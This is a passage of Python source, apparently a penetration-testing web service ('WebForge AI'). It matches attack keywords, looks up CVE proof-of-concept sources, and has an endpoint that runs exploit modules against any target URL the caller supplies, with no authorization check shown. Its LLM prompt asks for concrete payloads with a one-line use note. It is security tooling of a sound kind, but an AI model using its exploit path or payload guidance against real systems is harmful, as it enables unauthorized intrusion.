        "subdomain_takeover": ["subdomain takeover", "cname", "dangling dns", "dangling cname",
                               "unclaimed", "expired domain", "azurewebsites", "herokuapp", "s3 bucket"],
        "file_upload": ["file upload", "upload", "webshell", "multipart", "mime type bypass", ".php upload",
                        "restricted upload", "malicious file"],
        "privilege_escalation": ["privilege escalation", "priv esc", "elevation", "sudo", "suid",
                                 "kernel exploit", "lateral movement", "root"],
        "broken_auth": ["broken authentication", "authentication bypass", "session fixation",
                        "session hijacking", "credential stuffing", "password spraying", "login bypass",
                        "session timeout", "logout"],
        "email_injection": ["email injection", "header injection", "spoofing", "phishing", "smtp",
                            "mail header"],
        "business_logic": ["business logic", "logic flaw", "workflow bypass", "order manipulation",
                           "coupon abuse", "payment bypass", "step skipping", "discount abuse",
                           "infinite money"],
    }

    matched_categories = set()
    for vuln_id, keywords in patterns.items():
        score = sum(1 for kw in keywords if kw in combined)
        if score >= 2:
            matched_categories.add(vuln_id)

    if not matched_categories and any(kw in combined for kw in ["vuln", "finding", "issue", "alert", "risk"]):
        matched_categories.add("security_misconfig")

    for vuln_id in matched_categories:
        entry = AI_KB.get(vuln_id, {})
        findings.append({
            "id": vuln_id,
            "label": entry.get("label", vuln_id.replace("_", " ").title()),
            "severity": entry.get("severity", "MEDIUM"),
            "description": entry.get("description", ""),
            "poc": entry.get("poc", ""),
            "module": entry.get("module", ""),
            "remediation": entry.get("remediation", ""),
            "cwe": entry.get("cwe", ""),
            "match_score": score,
        })

    return findings

@router.post("/api/ai/analyze")
def ai_analyze(req: AiAnalyzeReq):
    """Analyze a security report (Burp, ZAP, or raw text) and explain findings."""
    text = req.report
    format_type = req.format

    findings = _detect_vuln_type(text)

    summary = {
        "total_findings": len(findings),
        "severity_breakdown": {},
    }
    for f in findings:
        sev = f["severity"]
        summary["severity_breakdown"][sev] = summary["severity_breakdown"].get(sev, 0) + 1

    result = {
        "success": True,
        "findings": findings,
        "summary": summary,
        "formats_detected": [format_type] if format_type != "auto" else ["raw_text"],
        "llm": _llm_status(),
    }

    if LLM_API_KEY:
        findings_text = "\n".join(
            f"- {f['label']} ({f['cwe']}) [{f['severity']}]: {f['description']} | PoC: {f['poc']}"
            for f in findings
        ) or "(no specific vulnerabilities detected in the report)"
        system = (
            "You are WebForge AI, a security report analyzer. Summarize the report's key risks, "
            "prioritize by severity, and give concrete next steps and remediation. "
            "Be concise, use markdown."
        )
        user = f"Report excerpt:\n{text[:4000]}\n\nDetected findings:\n{findings_text}"
        insights = _llm_chat(system, user, max_tokens=900, timeout=40.0)
        if insights:
            result["ai_insights"] = insights

    return result

@router.post("/api/ai/chat")
def ai_chat(req: AiChatReq):
    """Ask a security question and get an AI-powered analysis (cloud LLM if configured, else rule-based)."""
    q = req.question.lower()
    ctx = req.context.lower() if req.context else ""

    detected = _detect_vuln_type(q + " " + ctx)

    kb_matches = []
    for f in detected:
        entry = AI_KB.get(f["id"])
        if entry:
            kb_matches.append(entry)

    related = [{"id": f["id"], "label": f["label"], "severity": f["severity"]} for f in detected]

    cve_ids = re.findall(_CVE_RE, req.question)
    cve_data = None
    if cve_ids:
        cve_data = _cve2poc_lookup(cve_ids[0], timeout=30.0)

    # Optional cloud LLM path
    if LLM_API_KEY:
        system = (
            "You are WebForge AI, a concise web-security assistant for authorized penetration testing, "
            "bug bounty hunting, and remediation. Give concrete payloads, tools, and steps. "
            "Use the provided local knowledge base and CVE intel. "
            "When giving attack steps, end with a one-line authorized-use note. Use markdown formatting."
        )
        user = (
            f"User question: {req.question}\n\n"
            f"Local vulnerability knowledge base:\n{_kb_context(kb_matches)}\n\n"
            f"CVE intel (real, from CVE2PoC):\n{_cve_intel_text(cve_ids, cve_data)}"
        )
        llm_answer = _llm_chat(system, user)
        if llm_answer:
            return {
                "success": True,
                "answer": llm_answer,
                "related_findings": related,
                "llm": True,
                "model": LLM_MODEL,
            }

    generic_responses = {
        "sql": "SQL Injection: Injecting malicious SQL queries via input fields. Key test: `' OR '1'='1`. "
               "Use parameterized queries to prevent. Check for error-based, blind, and time-based variants.",
        "xss": "Cross-Site Scripting: Injecting scripts that execute in victims' browsers. "
               "Three types: Reflected (in response), Stored (persisted), DOM-based (client-side). "
               "Mitigation: CSP headers + output encoding + input validation.",
        "auth": "Authentication attacks include brute force, password spraying, credential stuffing, session hijacking, "
                "and JWT manipulation. Always test for rate limiting, account lockout, and MFA bypass.",
        "rce": "Remote Code Execution: The attacker runs arbitrary commands on the server. "
               "Common vectors: command injection, deserialization bugs, SSTI, file uploads, and vulnerable libraries. "
               "Always escalate: shell -> privilege escalation -> lateral movement.",
    }

    response_parts = []
    if kb_matches:
        for m in kb_matches[:3]:
            response_parts.append(f"**{m['label']}** ({m['cwe']}) — {m['description']}")
            response_parts.append(f"> PoC: {m['poc']}")
            response_parts.append(f"> Fix: {m['remediation']}")
        attack_chain = " -> ".join([m["label"] for m in kb_matches[:4]])
        if len(kb_matches) > 1:
            response_parts.append(f"**Attack Chain:** {attack_chain}")
    else:
        for key, resp in generic_responses.items():
            if key in q:
                response_parts.append(resp)
        if not response_parts:
            response_parts.append(
                "General security analysis: Review the application for common OWASP Top 10 vulnerabilities. "
                "Start with reconnaissance (subdomain enumeration, port scanning, technology fingerprinting), "
                "then move to automated scanning, then manual testing focused on authentication, "
                "authorization, and input validation bypasses."
            )

    cve_intel_parts = []
    if cve_ids:
        if cve_data and cve_data.get("success"):
            cve_intel_parts.append(f"**{cve_ids[0]} — Real-world intelligence (CVE2PoC)**")
            cve_intel_parts.append(
                f"> Severity: {cve_data.get('severity', 'N/A')} | CVSS: {cve_data.get('cvss_score', 'N/A')}"
                f" | EPSS: {cve_data.get('epss_score', 'N/A')} | KEV: {cve_data.get('kev', 'N/A')}"
                f" | CWE: {', '.join(cve_data.get('cwe', [])) or 'N/A'}"
            )
            if cve_data.get("vendor") and cve_data["vendor"] != "N/A":
                cve_intel_parts.append(f"> Affects: {cve_data['vendor']} {cve_data.get('affected_product', '')}".rstrip())
            if cve_data.get("description"):
                cve_intel_parts.append(f"**Description:** {cve_data['description']}")

            gh = cve_data.get("sources", {}).get("github") or {}
            if gh.get("pocs"):
                cve_intel_parts.append(f"**GitHub PoCs ({gh.get('count', len(gh['pocs']))} found):**")
                for poc in gh["pocs"][:3]:
                    star = poc.get("stargazers", 0)
                    cve_intel_parts.append(f"- {poc.get('name', poc.get('html_url'))} ⭐{star} — {poc.get('html_url')}")

            other = cve_data.get("sources", {}).get("metasploit_exploitdb_nuclei") or {}
            if other.get("metasploit"):
                cve_intel_parts.append(f"- **Metasploit:** `{other['metasploit']['command']}`")
            if other.get("exploitdb"):
                cve_intel_parts.append(f"- **ExploitDB:** `{other['exploitdb']['command']}`")
            if other.get("nuclei"):
                cve_intel_parts.append(f"- **Nuclei:** `{other['nuclei']['command']}`")

            if cve_data.get("remediation"):
                cve_intel_parts.append(f"**Fix:** {cve_data['remediation']}")
            if cve_data.get("kev") == "Yes":
                cve_intel_parts.append(
                    "**Warning:** This CVE is in the CISA Known Exploited Vulnerabilities catalog — actively exploited in the wild."
                )
        else:
            cve_intel_parts.append(
                f"**{cve_ids[0]}:** CVE2PoC lookup failed — {cve_data.get('error', 'unknown error') if cve_data else 'unknown error'}"
            )

    if cve_intel_parts:
        response_parts.append("\n".join(cve_intel_parts))

    return {
        "success": True,
        "answer": "\n\n".join(response_parts),
        "related_findings": related,
        "llm": False,
        "mode": "offline",
    }

@router.post("/api/ai/exploit")
def ai_exploit(req: AiExploitReq):
    """Generate and run a PoC for a detected vulnerability against a target."""
    host, port, ssl_flag, path = _parse_url(req.target)
    vuln_type = req.vulnerability.lower().replace(" ", "_")
    details = req.details

    module_path = None
    for v in AI_KB.values():
        if vuln_type in v["label"].lower().replace(" ", "_") or vuln_type == v.get("cwe", "").lower():
            module_path = v["module"]
            break

    if not module_path:
        for vid, v in AI_KB.items():
            if vid in vuln_type or vuln_type in vid:
                module_path = v["module"]
                break

    if not module_path:
        entry = AI_KB.get(vuln_type)
        if entry:
            module_path = entry["module"]

    result = {
        "vulnerability": vuln_type,
        "target": req.target,
        "module_used": module_path or "N/A",
        "poc_generated": "",
        "execution_result": None,
    }

    vuln_entry = None
    for v in AI_KB.values():
        if module_path and v.get("module") == module_path:
            vuln_entry = v
            break

    if vuln_entry:
        result["poc_generated"] = vuln_entry["poc"]
        result["remediation"] = vuln_entry.get("remediation", "")

    if module_path and module_path != "N/A":
        try:
            mod = _module_service.instantiate(module_path)
            if mod:
                mod.set_option("RHOSTS", host)
                mod.set_option("RPORT", port)
                mod.set_option("SSL", ssl_flag)
                mod.set_option("TARGETURI", path)
                if details:
                    mod.set_option("DETAILS", details)
                if hasattr(mod, 'run'):
                    run_result = _module_service.run(mod)
                else:
                    run_result = _module_service.exploit(mod)
                result["execution_result"] = run_result
                result["success"] = True
            else:
                result["execution_result"] = {"error": f"Module {module_path} not found. PoC available for manual testing."}
                result["success"] = False
        except Exception as e:
            result["execution_result"] = {"error": str(e)}
            result["success"] = False
    else:
        result["execution_result"] = {
            "note": "No matching module found. Manual exploitation required.",
            "poc_manual": vuln_entry["poc"] if vuln_entry else "Research the vulnerability type and craft a manual PoC."
        }
        result["success"] = False

    return result

_CVE_RE = re.compile(r"CVE-\d{4}-\d{4,7}", re.IGNORECASE)

_RICH_TAG_RE = re.compile(r"\[/?[a-zA-Z0-9_]+\]")

_GITHUB_FALSE_POSITIVES = {
    "https://github.com/fkie-cad/nvd-json-data-feeds",
    "https://github.com/nomi-sec/PoC-in-GitHub",
    "https://github.com/ARPSyndicate/cvemon",
    "https://github.com/ARPSyndicate/cve-scores",
}

_CVE2POC_REQUESTS_TIMEOUT = 15.0

_CVE2POC_BUDGET = 30.0

def _cve2poc_lookup(cve_id: str, timeout: float = _CVE2POC_BUDGET) -> dict:
    """Query the CVE2PoC engine for real PoCs and CVE intelligence.

    Returns partial results on timeout instead of blocking the HTTP response.
    """
    cve_id = cve_id.strip().upper()
    ex = ThreadPoolExecutor(max_workers=1, thread_name_prefix="cve2poc")
    try:
        return ex.submit(_cve2poc_lookup_impl, cve_id).result(timeout=timeout)
    except concurrent.futures.TimeoutError:
        return {
            "cve_id": cve_id,
            "success": False,
            "error": "CVE2PoC lookup timed out (network too slow). Try again or use the CVE Feed / Sploitus tabs.",
            "partial": True,
        }
    except Exception as e:
        return {
            "cve_id": cve_id,
            "success": False,
            "error": str(e),
        }
    finally:
        ex.shutdown(wait=False, cancel_futures=True)

def _cve2poc_lookup_impl(cve_id: str) -> dict:
    cve_id = cve_id.strip().upper()
    if not re.match(r"^CVE-\d{4}-\d{4,7}$", cve_id):
        return {
            "cve_id": cve_id,
            "success": False,
            "error": "Invalid CVE ID format. Use e.g. CVE-2021-44228",
        }

    try:
        from CVE2PoC.core.cve import (
            retrieve_cve_info_from_cve_org,
            get_cve_description,
            download_first_epss,
            get_epss,
            download_cisa_kev,
            is_kev,
        )
    except ImportError as e:
        return {
            "cve_id": cve_id,
            "success": False,
            "error": f"CVE2PoC engine not available: {e}",
        }

    github_headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-agent": "Mozilla/5.0 (WebForge AI)",
    }
    nvd_headers = {"User-agent": "Mozilla/5.0 (WebForge AI)"}
    headers = [github_headers, nvd_headers]

    result = {
        "cve_id": cve_id,
        "success": True,
        "errors": [],
        "sources": {},
    }

    steps = [
        (_cve2poc_step_cve_record, (cve_id, headers)),
        (_cve2poc_step_description, (cve_id,)),
        (_cve2poc_step_epss, (cve_id,)),
        (_cve2poc_step_kev, (cve_id,)),
        (_cve2poc_step_github, (cve_id, github_headers)),
        (_cve2poc_step_other_sources, (cve_id,)),
        (_cve2poc_step_bug_bounty, (cve_id,)),
        (_cve2poc_step_labs, (cve_id,)),
        (_cve2poc_step_mitigations, (cve_id,)),
    ]

    ex = ThreadPoolExecutor(max_workers=len(steps), thread_name_prefix="cve2poc-src")
    try:
        futs = {ex.submit(fn, *args): fn.__name__ for fn, args in steps}
        try:
            for fut in concurrent.futures.as_completed(futs, timeout=_CVE2POC_BUDGET):
                name = futs[fut]
                try:
                    keys, err = fut.result()
                except Exception as e:
                    keys, err = None, f"{name}: {e}"
                if err:
                    result["errors"].append(err)
                if keys:
                    srcs = keys.pop("sources", None)
                    result.update(keys)
                    if srcs:
                        result["sources"].update(srcs)
        except concurrent.futures.TimeoutError:
            result["errors"].append("lookup budget exceeded — some sources returned partial data")
    finally:
        ex.shutdown(wait=False, cancel_futures=True)

    return result

def _cve2poc_step_cve_record(cve_id: str, headers: list) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.cve import retrieve_cve_info_from_cve_org

        record = retrieve_cve_info_from_cve_org(cve_id, headers)
        if not record:
            return {"state": "N/A"}, None
        keys = {
            "state": record.get("state", "N/A"),
            "publication_date": record.get("publication_date", "N/A"),
            "vendor": record.get("vendor", "N/A"),
            "affected_product": record.get("affected_product", "N/A"),
            "cvss_score": record.get("base_score", "N/A"),
            "severity": record.get("severity", "N/A"),
            "vector_string": record.get("vector_string", "N/A"),
            "cwe": record.get("cwe") or [],
        }
        if keys["state"] == "REJECTED":
            keys["rejected_reason"] = record.get("rejectedReasons", "N/A")
        return keys, None
    except Exception as e:
        return None, f"cve_record: {e}"

def _cve2poc_step_description(cve_id: str) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.cve import get_cve_description

        desc = get_cve_description(cve_id)
        if desc == "N/A":
            return None, None
        return {"description": re.sub(r"\s+", " ", desc).strip()}, None
    except Exception as e:
        return None, f"description: {e}"

def _cve2poc_step_epss(cve_id: str) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.cve import download_first_epss, get_epss

        epss_data = download_first_epss()
        return {"epss_score": get_epss(cve_id, epss_data)}, None
    except Exception as e:
        return {"epss_score": "N/A"}, f"epss: {e}"

def _cve2poc_step_kev(cve_id: str) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.cve import download_cisa_kev, is_kev

        kevs = download_cisa_kev()
        if kevs is None:
            return {"kev": "N/A"}, None
        kev_status, kev_record = is_kev(kevs, cve_id)
        keys = {"kev": kev_status}
        if kev_record:
            keys["kev_notes"] = re.sub(r"\s+", " ", kev_record.get("notes", "")).strip()
        return keys, None
    except Exception as e:
        return {"kev": "N/A"}, f"kev: {e}"

def _cve2poc_step_github(cve_id: str, github_headers: dict) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.exploits import search_github_exploits

        gh_pocs, poc_url = search_github_exploits(cve_id, github_headers)
        github_pocs = []
        if poc_url.endswith(".json") and isinstance(gh_pocs, list):
            sorted_pocs = sorted(
                gh_pocs,
                key=lambda x: (x.get("stargazers_count", 0), x.get("forks", 0)),
                reverse=True,
            )
            for poc in sorted_pocs[:5]:
                github_pocs.append({
                    "name": poc.get("full_name") or poc.get("html_url", ""),
                    "html_url": poc.get("html_url", ""),
                    "description": poc.get("description") or "",
                    "stargazers": poc.get("stargazers_count", 0),
                    "forks": poc.get("forks", 0),
                    "created_at": poc.get("created_at", ""),
                })
        elif poc_url.endswith(".md") and gh_pocs:
            for li in gh_pocs[:5]:
                text = getattr(li, "text", str(li)).strip()
                if text.startswith("https://github.com/") and text not in _GITHUB_FALSE_POSITIVES:
                    github_pocs.append({"html_url": text})
        return {
            "sources": {
                "github": {
                    "count": len(gh_pocs) if gh_pocs else 0,
                    "url": poc_url if poc_url != "#" else None,
                    "pocs": github_pocs,
                }
            }
        }, None
    except Exception as e:
        return None, f"github_pocs: {e}"

def _cve2poc_step_other_sources(cve_id: str) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.exploits import download_exploits_db, search_exploits_from_other_sources

        msf_db, edb_db, nuclei_db = download_exploits_db()
        sources = search_exploits_from_other_sources(cve_id, msf_db, edb_db, nuclei_db)
        other = {}
        if sources.get("metasploit"):
            fullname, rank = sources["metasploit"]
            other["metasploit"] = {
                "module": fullname,
                "rank": _RICH_TAG_RE.sub("", str(rank)).strip(),
                "command": f"msfconsole -q -x 'use {fullname}'",
                "url": f"https://www.rapid7.com/db/modules/{fullname}",
            }
        if sources.get("exploitdb"):
            file_, eid = sources["exploitdb"]
            other["exploitdb"] = {
                "file": file_,
                "command": f"searchsploit -m {file_}",
                "url": f"https://www.exploit-db.com/exploits/{eid}",
            }
        if sources.get("nuclei"):
            tpl_path, tpl_url = sources["nuclei"]
            other["nuclei"] = {
                "template": tpl_path,
                "command": f"nuclei -t {tpl_path}" if tpl_path else "nuclei -t <template> [-u <target>]",
                "url": tpl_url,
            }
        if not other:
            return None, None
        return {"sources": {"metasploit_exploitdb_nuclei": other}}, None
    except Exception as e:
        return None, f"other_sources: {e}"

def _cve2poc_step_bug_bounty(cve_id: str) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.bug_bounty import search_bug_bounty_reports

        bb = search_bug_bounty_reports(cve_id)
        reports = []
        if bb.get("h1"):
            poc_flag, link = bb["h1"]
            reports.append({"source": "HackerOne", "poc_available": _RICH_TAG_RE.sub("", poc_flag).strip(), "url": link})
        if bb.get("pentesterland"):
            _, link = bb["pentesterland"]
            reports.append({"source": "pentesterland", "poc_available": "N/A", "url": link})
        if bb.get("bug_bounty_hunting_search_engine"):
            _, link = bb["bug_bounty_hunting_search_engine"]
            reports.append({"source": "Bug Bounty Hunting Search Engine", "poc_available": "N/A", "url": link})
        if not reports:
            return None, None
        return {"sources": {"bug_bounty": reports}}, None
    except Exception as e:
        return None, f"bug_bounty: {e}"

def _cve2poc_step_labs(cve_id: str) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.labs import search_pre_built_vulnerable_docker_environments, search_ctf_labs

        labs = {}
        docker = search_pre_built_vulnerable_docker_environments(cve_id)
        if docker != "N/A":
            labs["docker_vulhub"] = docker
        ctf = search_ctf_labs(cve_id)
        if ctf:
            labs.update(ctf)
        if not labs:
            return None, None
        return {"sources": {"labs": labs}}, None
    except Exception as e:
        return None, f"labs: {e}"

def _cve2poc_step_mitigations(cve_id: str) -> tuple[dict | None, str | None]:
    try:
        from CVE2PoC.core.mitigations import get_cveid_nuclei_template, get_nuclei_remediations

        template = get_cveid_nuclei_template(cve_id)
        if template:
            rem = get_nuclei_remediations(template)
            if rem != "N/A":
                return {"remediation": rem}, None
        return None, None
    except Exception as e:
        return None, f"mitigations: {e}"

@router.post("/api/ai/cve-poc")
def ai_cve_poc(req: AiCvePocReq):
    """Look up a CVE ID and return real PoCs + CVE intelligence via the CVE2PoC engine."""
    return _cve2poc_lookup(req.cve_id)
